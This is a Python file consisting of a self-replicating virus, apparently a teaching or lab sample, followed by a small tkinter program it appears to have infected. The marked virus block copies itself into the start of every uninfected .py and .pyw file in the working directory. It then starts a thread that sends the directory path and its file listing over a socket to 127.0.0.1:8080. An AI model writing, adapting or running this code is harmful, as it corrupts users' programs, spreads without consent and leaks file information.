### START OF VIRUS ###
import glob, sys, threading, os, socket

START = '### START OF VIRUS ###\n'
END = '### END OF VIRUS ###\n'

virus = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_part = False

for l in lines:
    if l == START:
        virus_part = True
    
    if virus_part:
        virus.append(l)

    if l == END:
        break

py_programs = glob.glob('*.py') + glob.glob('*.pyw')

for p in py_programs:
    with open(p, 'r') as f:
        program = f.readlines()

    infected = False

    for l in program:
        if l==START:
            infected = True
            break
    
    if not infected:
        infected_program = []
        #Virus part (from START to END)
        infected_program.extend(virus)
        #\n to separate virus from program
        infected_program.extend('\n')
        #Program part (already present in p program)
        infected_program.extend(program)

        with open(p, 'w') as f:
            f.writelines(infected_program)

#Malicious code
def malicious_code():
    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect(('127.0.0.1',8080))
    msg = os.getcwd()+'\r\n'+','.join(os.listdir('.'))
    length = f'{len(msg.encode())}'.encode()
    sd.send(length+b'\r\n'+msg.encode())
    sd.close()

t = threading.Thread(target=malicious_code)
t.start()

### END OF VIRUS ###

import tkinter
top = tkinter.Tk()
top.mainloop()